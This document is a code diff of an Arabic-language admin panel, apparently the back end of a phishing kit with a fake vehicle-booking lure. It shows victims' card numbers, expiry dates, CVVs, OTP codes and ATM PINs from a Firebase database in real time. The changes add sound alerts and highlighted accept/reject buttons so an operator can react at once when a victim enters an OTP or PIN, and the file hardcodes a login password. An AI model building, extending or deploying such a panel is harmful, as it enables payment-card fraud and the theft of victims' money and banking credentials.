@@ -7,58 +7,56 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: white; margin: 0; padding: 0; }
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
-        .login-box h2 { color: #1e7344; margin-bottom: 20px; }
+        .login-box { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 350px; text-align: center; color: #333; }
         .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
         .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         #adminContent { display: none; }
         .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
         .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
         .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
+
+        /* تنسيق البيانات */
+        .operation-row { background: #1e1e1e; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #333; border-right: 8px solid #1e7344; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
+        .customer-name { font-weight: bold; color: #4caf50; font-size: 16px; }
         
-        /* تنسيق كروت البيانات */
-        .operation-row { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; }
-        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; }
-        .customer-name { font-weight: bold; color: #1e7344; font-size: 16px; }
+        .data-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 15px; }
+        .info-box { background: #2d2d2d; border: 1px solid #444; padding: 8px; border-radius: 6px; min-width: 110px; text-align: center; }
+        .info-label { display: block; font-size: 10px; color: #aaa; margin-bottom: 4px; }
+        .info-value { display: block; font-size: 13px; color: #fff; font-weight: bold; }
         
-        .data-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
-        .info-box { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 8px; min-width: 120px; text-align: center; }
-        .info-label { display: block; font-size: 11px; color: #666; margin-bottom: 4px; font-weight: bold; }
-        .info-value { display: block; font-size: 14px; color: #333; font-weight: bold; }
-        
-        .card-highlight { background: #fffcf0; border-color: #fcebb6; }
-        .otp-box { background: #e3f2fd; border-color: #bbdefb; }
-        .pin-box { background: #f3e5f5; border-color: #e1bee7; }
-        
+        /* ألوان التنبيه */
+        .highlight-new { border-color: #ffd700 !important; background: #3d3d2d !important; animation: borderPulse 2s infinite; }
+        @keyframes borderPulse { 0% { border-color: #333; } 50% { border-color: #ffd700; } 100% { border-color: #333; } }
+
+        /* أزرار التحكم - الافتراضي رمادي غامق */
         .actions-area { display: flex; gap: 10px; }
-        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; }
-        .btn-accept { background: #28a745; }
-        .btn-accept:hover { background: #218838; }
-        .btn-reject { background: #dc3545; }
-        .btn-reject:hover { background: #c82333; }
+        .btn { flex: 1; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; background: #444; color: #888; }
         
-        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
-        .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
-        
-        .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
+        /* لما يكون فيه جديد ترجع الألوان */
+        .btn-new-data.btn-accept { background: #28a745 !important; color: white !important; box-shadow: 0 0 10px rgba(40, 167, 69, 0.4); }
+        .btn-new-data.btn-reject { background: #dc3545 !important; color: white !important; box-shadow: 0 0 10px rgba(220, 53, 69, 0.4); }
+
+        .status-badge { padding: 4px 10px; border-radius: 10px; font-size: 11px; font-weight: bold; }
+        .status-waiting { background: #5a4a00; color: #ffd700; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
 
+<audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
 <div id="loginOverlay">
     <div class="login-box">
-        <h2>تسجيل الدخول</h2>
-        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
+        <h2>لوحة التحكم</h2>
+        <input type="text" id="username" placeholder="المستخدم">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button onclick="checkLogin()">دخول</button>
-        <p id="loginError" style="color:red; display:none; margin-top:10px; font-size:14px;">بيانات غير صحيحة!</p>
     </div>
 </div>
 
@@ -67,41 +65,30 @@
     <div class="navbar">
         <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
         <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
-        <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
+        <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
     </div>
     <div class="container">
-        <div id="bookingSection" class="tab-content active">
-            <div id="bookingGrid"></div>
-        </div>
-        <div id="cardsSection" class="tab-content">
-            <div id="paymentsContainer"></div>
-        </div>
+        <div id="bookingSection" class="tab-content active"><div id="bookingGrid"></div></div>
+        <div id="cardsSection" class="tab-content"><div id="paymentsContainer"></div></div>
     </div>
 </div>
 
 <script>
-    function checkSavedLogin() {
-        if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
-    }
-
+    function checkSavedLogin() { if (localStorage.getItem("admin_logged_in") === "true") showAdmin(); }
     function checkLogin() {
-        const userInput = document.getElementById('username').value.trim().toLowerCase();
-        const passInput = document.getElementById('password').value.trim();
-        if(["adman", "adman_"].includes(userInput) && passInput === "H0987654H") {
+        if(document.getElementById('password').value === "H0987654H") {
             localStorage.setItem("admin_logged_in", "true");
             showAdmin();
-        } else {
-            document.getElementById('loginError').style.display = 'block';
         }
     }
-
-    function showAdmin() {
-        document.getElementById('loginOverlay').style.display = 'none';
-        document.getElementById('adminContent').style.display = 'block';
-        initFirebase();
+    function showAdmin() { 
+        document.getElementById('loginOverlay').style.display = 'none'; 
+        document.getElementById('adminContent').style.display = 'block'; 
+        initFirebase(); 
     }
-
     function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
+
+    function playSound() { document.getElementById('alertSound').play().catch(e => console.log("Sound error")); }
 
     function initFirebase() {
         const firebaseConfig = {
@@ -113,92 +100,95 @@
             messagingSenderId: "1009002235896",
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
-        
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
         // عداد الزوار
         database.ref('live_visitors').on('value', s => {
             let active = 0; const now = Date.now();
-            s.forEach(c => {
-                if(now - c.val().last_active < 30000) active++;
-                else database.ref('live_visitors/'+c.key).remove();
-            });
+            s.forEach(c => { if(now - c.val().last_active < 30000) active++; });
             document.getElementById('onlineCount').innerText = active;
         });
 
-        // بيانات الحجوزات
-        database.ref('visitors').on('child_added', (snapshot) => {
-            const val = snapshot.val();
-            const grid = document.getElementById('bookingGrid');
-            const row = document.createElement('div');
-            row.className = 'operation-row';
-            row.innerHTML = `
-                <div class="card-header">
-                    <span class="customer-name">${val.fullName || 'زائر جديد'}</span>
-                </div>
-                <div class="data-grid">
-                    <div class="info-box"><span class="info-label">نوع السيارة</span><span class="info-value">${val.vehicleType || '-'}</span></div>
-                    <div class="info-box"><span class="info-label">رقم اللوحة</span><span class="info-value">${val.plateNumber || '-'}</span></div>
-                    <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.bookingDate || '-'}</span></div>
-                    <div class="info-box"><span class="info-label">الوقت</span><span class="info-value">${val.bookingTime || '-'}</span></div>
-                </div>
-            `;
-            grid.prepend(row);
+        // الحجوزات - الجديد في الأول
+        database.ref('visitors').on('child_added', s => {
+            const val = s.val();
+            const div = document.createElement('div');
+            div.className = 'operation-row';
+            div.innerHTML = `<span class="customer-name">${val.fullName}</span><br><small>${val.vehicleType} - ${val.plateNumber}</small>`;
+            document.getElementById('bookingGrid').prepend(div);
         });
 
-        // بيانات البطاقات (تنسيق منظم جداً)
-        database.ref('payments').on('child_added', (snapshot) => {
-            const val = snapshot.val();
-            const container = document.getElementById('paymentsContainer');
-            const row = document.createElement('div');
-            row.className = 'operation-row';
-            row.id = 'p_' + snapshot.key;
-            
-            let statusText = "مستقر";
-            let statusClass = "";
-            if(val.status && val.status.includes('waiting')) {
-                statusText = "انتظار ⏳";
-                statusClass = "status-waiting";
-            }
-
-            row.innerHTML = `
-                <div class="card-header">
-                    <span class="customer-name">${val.cardHolder || 'عميل'}</span>
-                    <span id="stat_${snapshot.key}" class="status-badge ${statusClass}">${statusText}</span>
-                </div>
-                <div class="data-grid">
-                    <div class="info-box card-highlight"><span class="info-label">رقم البطاقة</span><span class="info-value" style="letter-spacing:1px;">${val.cardNumber || '----'}</span></div>
-                    <div class="info-box card-highlight"><span class="info-label">انتهاء (YY/MM)</span><span class="info-value">${val.expiry || '--/--'}</span></div>
-                    <div class="info-box card-highlight"><span class="info-label">CVV</span><span class="info-value">${val.cvv || '---'}</span></div>
-                    <div class="info-box otp-box"><span class="info-label">كود OTP</span><span class="info-value">${val.otp || '-'}</span></div>
-                    <div class="info-box pin-box"><span class="info-label">رقم PIN</span><span class="info-value">${val.atm_pin || '-'}</span></div>
-                </div>
-                <div class="actions-area">
-                    <button class="btn btn-accept" onclick="updateStatus('${snapshot.key}', 'accept')">قبول الطلب</button>
-                    <button class="btn btn-reject" onclick="updateStatus('${snapshot.key}', 'reject')">رفض الطلب</button>
-                </div>
-            `;
-            container.prepend(row);
+        // البطاقات - النظام الذكي
+        database.ref('payments').on('child_added', s => {
+            renderCard(s.key, s.val(), true); // true تعني بيانات جديدة تماماً
         });
 
-        // تحديث الحالة
-        database.ref('payments').on('child_changed', (snapshot) => {
-            const val = snapshot.val();
-            const badge = document.getElementById('stat_' + snapshot.key);
-            if (badge) {
-                if (val.status === 'accept') { badge.innerText = "مقبول ✅"; badge.className = "status-badge"; badge.style.background = "#d4edda"; }
-                else if (val.status === 'reject') { badge.innerText = "مرفوض ❌"; badge.className = "status-badge"; badge.style.background = "#f8d7da"; }
+        database.ref('payments').on('child_changed', s => {
+            const val = s.val();
+            const existingRow = document.getElementById('p_' + s.key);
+            if(existingRow) {
+                // إذا العميل حدث OTP أو PIN والعملية كانت انتظار، نشغل التنبيه
+                if(val.status && val.status.includes('waiting')) {
+                    existingRow.classList.add('highlight-new');
+                    const btns = existingRow.querySelectorAll('.btn');
+                    btns.forEach(b => b.classList.add('btn-new-data'));
+                    playSound();
+                }
+                // تحديث القيم داخل المربعات
+                existingRow.querySelector('.otp-val').innerText = val.otp || '-';
+                existingRow.querySelector('.pin-val').innerText = val.atm_pin || '-';
+                
+                // تحديثBadge الحالة
+                const badge = document.getElementById('stat_'+s.key);
+                if(val.status === 'accept') { badge.innerText = "مقبول ✅"; badge.style.background = "#28a745"; existingRow.classList.remove('highlight-new'); }
+                if(val.status === 'reject') { badge.innerText = "مرفوض ❌"; badge.style.background = "#dc3545"; existingRow.classList.remove('highlight-new'); }
             }
         });
     }
 
-    function updateStatus(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
+    function renderCard(key, val, isNew) {
+        const container = document.getElementById('paymentsContainer');
+        const row = document.createElement('div');
+        row.className = 'operation-row' + (isNew ? ' highlight-new' : '');
+        row.id = 'p_' + key;
+        
+        // الأزرار تأخذ كلاس التنبيه لو البيانات جديدة
+        const btnClass = isNew ? 'btn-new-data' : '';
+        if(isNew) playSound();
 
-    function openTab(evt, tabName) {
+        row.innerHTML = `
+            <div class="card-header">
+                <span class="customer-name">${val.cardHolder || 'عميل جديد'}</span>
+                <span id="stat_${key}" class="status-badge status-waiting">انتظار ⏳</span>
+            </div>
+            <div class="data-grid">
+                <div class="info-box"><span class="info-label">رقم البطاقة</span><span class="info-value">${val.cardNumber}</span></div>
+                <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.expiry}</span></div>
+                <div class="info-box"><span class="info-label">CVV</span><span class="info-value">${val.cvv}</span></div>
+                <div class="info-box" style="border-color:#2196f3"><span class="info-label">OTP</span><span class="info-value otp-val">${val.otp || '-'}</span></div>
+                <div class="info-box" style="border-color:#9c27b0"><span class="info-label">PIN</span><span class="info-value pin-val">${val.atm_pin || '-'}</span></div>
+            </div>
+            <div class="actions-area">
+                <button class="btn btn-accept ${btnClass}" onclick="updateStat('${key}', 'accept', this)">قبول</button>
+                <button class="btn btn-reject ${btnClass}" onclick="updateStat('${key}', 'reject', this)">رفض</button>
+            </div>
+        `;
+        container.prepend(row);
+    }
+
+    function updateStat(id, action, btn) {
+        firebase.database().ref('payments/' + id).update({ status: action });
+        // عند الضغط، نرجع أزرار هذا الكرت للوضع الرمادي ونشيل التنبيه
+        const row = document.getElementById('p_' + id);
+        row.classList.remove('highlight-new');
+        row.querySelectorAll('.btn').forEach(b => b.classList.remove('btn-new-data'));
+    }
+
+    function openTab(evt, name) {
         document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
         document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
-        document.getElementById(tabName).style.display = "block";
+        document.getElementById(name).style.display = "block";
         evt.currentTarget.className += " active";
     }
 </script>
